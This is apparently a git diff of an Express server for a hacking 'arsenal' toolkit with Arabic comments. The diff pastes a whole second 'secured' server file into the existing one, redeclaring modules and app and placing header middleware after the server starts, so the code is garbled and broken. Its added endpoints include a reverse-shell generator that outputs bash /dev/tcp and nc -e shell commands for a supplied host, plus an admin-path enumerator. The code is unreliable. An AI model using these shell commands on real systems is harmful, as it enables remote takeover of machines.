@@ -83,7 +83,7 @@ app.post('/api/binary', (req, res) => {
 });
 
 // 5) File hashing (SHA-256)
-app.post('/api/hash-file', upload.single('file'), async(req, res) => {
+app.post('/api/hash-file', upload.single('file'), async (req, res) => {
     if (!req.file) return res.status(400).json({ error: 'no file uploaded' });
     const hash = crypto.createHash('sha256').update(req.file.buffer).digest('hex');
     res.json({ filename: req.file.originalname, sha256: hash });
@@ -123,7 +123,7 @@ app.post('/api/network-calc', (req, res) => {
 });
 
 // 8) IP Geolocation 
-app.get('/api/ip-geo/:ip', async(req, res) => {
+app.get('/api/ip-geo/:ip', async (req, res) => {
     const ip = req.params.ip || '';
     if (!ip) return res.status(400).json({ error: 'no ip' });
     try {
@@ -218,10 +218,137 @@ app.get('/api/admin-paths', (req, res) => {
     res.json({ domain, candidates: paths.map(p => `https://${domain}${p}`) });
 });
 
+// server.js - Secured Version 1.1
+// Developed by CyberMan Ops - Protective Measures Implemented
+
+const express = require('express');
+const cors = require('cors');
+const rateLimit = require('express-rate-limit');
+const multer = require('multer');
+const crypto = require('crypto');
+const fetch = require('node-fetch');
+const path = require('path');
+
+const app = express();
+const upload = multer({ storage: multer.memoryStorage() });
+
+// ✅ 1. الإعدادات الأساسية (الترتيب مهم جداً للأمن)
+app.use(express.json());
+app.use(cors({ origin: '*' }));
+
+// ✅ 2. حماية الـ Rate Limit (سد ثغرة الـ DoS والـ Probing)
+// تم تقليل الـ max لـ 30 طلب لضمان عدم استنزاف موارد السيرفر
+const limiter = rateLimit({
+    windowMs: 5 * 60 * 1000, // 5 دقائق
+    max: 30, // حد أقصى 30 طلب لكل IP
+    standardHeaders: true,
+    legacyHeaders: false,
+    message: {
+        status: 429,
+        error: "🛡️ Cyber Ops Defense: Too many requests from this IP. System on high alert."
+    }
+});
+app.use(limiter);
+
+// ✅ 3. ربط ملفات الـ HTML والـ CSS
+app.use(express.static(path.join(__dirname, 'public')));
+
+// ✅ 4. المسارات الأساسية (Routes)
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+/* -------------------------
+   الـ APIs الخاصة بالترسانة
+   ------------------------- */
+
+// 1) توليد باسوورد
+app.get('/api/password', (req, res) => {
+    const length = parseInt(req.query.len) || 16;
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{};:,.<>?';
+    let pass = '';
+    for (let i = 0; i < length; i++) pass += chars[Math.floor(Math.random() * chars.length)];
+    res.json({ password: pass });
+});
+
+// 2) Base64 Encode/Decode
+app.post('/api/base64/encode', (req, res) => {
+    const txt = (req.body.text || '');
+    const b64 = Buffer.from(txt, 'utf8').toString('base64');
+    res.json({ base64: b64 });
+});
+
+app.post('/api/base64/decode', (req, res) => {
+    const b64 = (req.body.base64 || '');
+    try {
+        const txt = Buffer.from(b64, 'base64').toString('utf8');
+        res.json({ text: txt });
+    } catch (e) {
+        res.status(400).json({ error: 'invalid base64' });
+    }
+});
+
+// 3) IP Geolocation 
+app.get('/api/ip-geo/:ip', async (req, res) => {
+    const ip = req.params.ip || '';
+    try {
+        const resp = await fetch(`http://ip-api.com/json/${encodeURIComponent(ip)}`);
+        const data = await resp.json();
+        res.json({ source: 'ip-api.com', data });
+    } catch (e) {
+        res.status(500).json({ error: 'lookup failed' });
+    }
+});
+
+// 4) Reverse-shell generator (Educational only)
+app.post('/api/rev-shell/generate', (req, res) => {
+    const lhost = (req.body.lhost || '').trim();
+    const lport = (req.body.lport || '').trim();
+    if (!lhost || !lport) return res.status(400).json({ error: 'lhost and lport required' });
+    const examples = {
+        bash: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
+        nc: `nc -e /bin/sh ${lhost} ${lport}`
+    };
+    res.json({ examples });
+});
+
+// (يمكنك إضافة باقي الـ APIs هنا بنفس النمط)
+
 /* -----------------------------
-   Start server
-------------------------------*/
+   5. تشغيل السيرفر مع حماية الـ Timeouts
+   -----------------------------*/
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server is running on http://localhost:${PORT}`);
+
+const server = app.listen(PORT, () => {
+    console.log(`
+    🛡️  ==========================================
+    🛡️  CYBER OPS ARSENAL - SECURE MODE ENABLED
+    🛡️  Port: ${PORT} | Timeouts: Active
+    🛡️  ==========================================
+    `);
+});
+
+// ✅ سد ثغرة الـ Slowloris والطلبات الناقصة (التي اكتشفها المخترق)
+// إغلاق الاتصال إذا لم يتم إرسال الهيدرز خلال 10 ثوانٍ
+server.headersTimeout = 10000;
+// إغلاق الاتصال إذا استغرق الطلب أكثر من 15 ثانية
+server.requestTimeout = 15000;
+// تقليل وقت بقاء الاتصال مفتوحاً (Keep-Alive) لمنع استنزاف الموارد
+server.keepAliveTimeout = 5000;
+
+// حماية الـ Socket من الاتصالات المعلقة
+server.on('connection', (socket) => {
+    socket.setTimeout(10000);
+    socket.on('timeout', () => {
+        socket.destroy();
+    });
+});
+app.use((req, res, next) => {
+    // تمنع عرض موقعك داخل iframe في أي موقع غريب
+    res.setHeader("X-Frame-Options", "DENY");
+    // تمنع المتصفح من محاولة تخمين نوع الملفات (تحمي من ملفات الميديا الملغومة)
+    res.setHeader("X-Content-Type-Options", "nosniff");
+    // تفعيل فلتر الـ XSS المدمج في المتصفحات القديمة
+    res.setHeader("X-XSS-Protection", "1; mode=block");
+    next();
 });
